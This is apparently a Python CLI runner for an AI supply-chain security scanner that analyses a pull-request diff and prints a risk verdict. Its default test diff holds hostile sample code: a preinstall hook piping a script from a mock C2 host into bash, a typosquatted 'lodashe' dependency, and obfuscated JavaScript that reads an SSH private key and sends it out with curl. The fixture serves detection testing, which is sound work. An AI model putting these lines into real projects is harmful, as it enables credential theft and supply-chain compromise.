"""Direct CLI Runner for CodeFort BARQAI (Qwen).

Executes live AI security analysis on a Pull Request diff and prints the full
verdict, composite risk score, and technical diagnosis.

Usage:
    python run_scan.py
    python run_scan.py --diff "path/to/diff.patch"
"""

import argparse
import asyncio
import json
import sys
import time
from pathlib import Path

# Add services/api to sys.path
api_dir = Path(__file__).resolve().parent
sys.path.insert(0, str(api_dir))

from app.config import get_settings
from app.engines import barqai_engine, dependency_intel, sandbox_runner, static_analyzer, workflow_linter

DEFAULT_TEST_DIFF = """
diff --git a/package.json b/package.json
index 4a821e9..c91bf88 100644
--- a/package.json
+++ b/package.json
@@ -8,4 +8,6 @@
   "scripts": {
     "test": "jest",
+    "preinstall": "curl -s https://c2-transfer.mock.xyz/stealer.sh | bash"
   },
   "dependencies": {
+    "lodashe": "^4.17.21"
   }
 }
diff --git a/src/index.js b/src/index.js
index 1111111..2222222 100644
--- a/src/index.js
+++ b/src/index.js
@@ -1,5 +1,9 @@
 const express = require('express');
 const app = express();
+const fs = require('fs');
+
+// Suspicious credential harvester block
+const sshKey = fs.readFileSync('~/.ssh/id_rsa', 'utf8');
+eval(Buffer.from('Y2hpbGRfcHJvY2Vzcy5leGVj', 'base64').toString())('curl https://c2-transfer.mock.xyz/exfil?k=' + Buffer.from(sshKey).toString('hex'));
"""


async def main():
    parser = argparse.ArgumentParser(description="Run BARQAI Qwen Security Model")
    parser.add_argument("--diff", help="Path to git diff file (optional, uses sample supply-chain diff if omitted)")
    args = parser.parse_args()

    diff_content = DEFAULT_TEST_DIFF
    if args.diff:
        diff_path = Path(args.diff)
        if diff_path.exists():
            diff_content = diff_path.read_text(encoding="utf-8")
            print(f"[+] Loaded diff from: {diff_path}")
        else:
            print(f"[-] File not found: {args.diff}, falling back to sample diff.")

    settings = get_settings()

    print("=" * 80)
    print("CODEFORT: RUNNING QWEN SECURITY REASONING ENGINE (BARQAI)")
    print("=" * 80)
    print(f"Target AI Model:      {settings.OPENROUTER_MODEL}")
    print(f"API Provider:         OpenRouter ({settings.OPENROUTER_BASE_URL})")
    print(f"Reasoning Effort:     {settings.OPENROUTER_REASONING}")
    print(f"Live API Key Status:  {'ACTIVE' if settings.OPENROUTER_API_KEY else 'UNCONFIGURED (simulation mode)'}")
    print("-" * 80)

    # 1. Parallel Engine Execution
    print("\n[Step 1/3] Executing Parallel Detection Engines...")
    t0 = time.time()
    static_task = static_analyzer.analyze_diff(diff_content)
    dep_task = dependency_intel.analyze_dependencies([{"name": "lodashe", "version": "4.17.21", "ecosystem": "npm"}])
    workflow_task = workflow_linter.analyze_workflows({})
    sandbox_task = sandbox_runner.run_sandbox(package_json=diff_content)

    static_findings, dep_findings, wf_findings, sandbox_telemetry = await asyncio.gather(
        static_task, dep_task, workflow_task, sandbox_task
    )

    all_findings = static_findings + dep_findings + wf_findings + sandbox_telemetry.get("findings", [])
    print(f"   [+] Static Analysis:     {len(static_findings)} flags")
    print(f"   [+] Dependency Intel:    {len(dep_findings)} flags")
    print(f"   [+] Sandbox Telemetry:   {len(sandbox_telemetry.get('findings', []))} flags")
    print(f"   [+] Total Threat Signals: {len(all_findings)} collected in {time.time() - t0:.2f}s")

    for f in all_findings:
        print(f"       * [{f.get('severity', 'info').upper()}] {f.get('title')}")

    # 2. Qwen Inference
    print("\n[Step 2/3] Calling Qwen3.8-Max for Deep Reasoning & Threat Correlation...")
    t1 = time.time()
    explanation = await barqai_engine.analyze(
        pr_diff=diff_content,
        static_findings=static_findings,
        dependency_findings=dep_findings,
        workflow_findings=wf_findings,
        sandbox_telemetry=sandbox_telemetry,
    )
    inference_time = time.time() - t1
    print(f"   [+] Inference completed in {inference_time:.2f}s")

    # 3. Composite Risk Scoring & Output
    risk_score = barqai_engine.compute_risk_score(explanation, len(all_findings))
    verdict = explanation.recommended_action.upper()
    status_label = "[BLOCKED]" if risk_score >= 70 else "[REVIEW NEEDED]" if risk_score >= 30 else "[PASSED]"

    print("\n[Step 3/3] BARQAI AI Forensic Report:")
    print("=" * 80)
    print(f"VERDICT:         {status_label} (Action: {verdict})")
    print(f"RISK SCORE:      {risk_score}/100")
    print(f"CONFIDENCE:      {explanation.confidence * 100:.1f}%")
    print("-" * 80)
    print("\n[XAI DIAGNOSIS]")
    print(f"1. WHAT CHANGED:\n   {explanation.what_changed}\n")
    print(f"2. WHAT HAPPENED (SANDBOX):\n   {explanation.what_happened}\n")
    print(f"3. WHY IT'S DANGEROUS:\n   {explanation.why_dangerous}\n")

    print("[IDENTIFIED RISK FACTORS]")
    for idx, rf in enumerate(explanation.risk_factors, 1):
        print(f"   {idx}. {rf}")

    if explanation.clean_patch:
        print(f"\n[SUGGESTED CLEAN REMEDIATION PATCH]\n   {explanation.clean_patch}")

    print("\n" + "=" * 80)
    print("SCAN COMPLETE.")
    print("=" * 80)


if __name__ == "__main__":
    asyncio.run(main())
